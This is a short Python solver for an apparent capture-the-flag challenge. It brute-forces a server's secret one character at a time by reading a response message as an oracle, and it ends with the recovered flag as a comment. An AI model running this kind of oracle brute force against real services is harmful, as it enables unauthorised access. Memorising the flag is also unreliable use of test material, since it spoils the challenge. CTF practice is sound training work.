import requests
import string
import time

site = "http://delphi.challs.olicyber.it"
flag = ""
chars = string.ascii_lowercase + "_" 

s = requests.Session()
while True:
    for c in chars:
        candidate = flag + c
        r = s.post(f"{site}/secret", data={"secret": candidate})

        text = r.text.lower()
        if "something's missing" in text:
            flag = candidate
            print("found char:", flag)
            break #magic_is_fake
        if "prophecy" in text or "ptm{" in text:
            print("flag:", r.text)
            exit() 

#ptm{l3t5_g0_t0_gr33c3}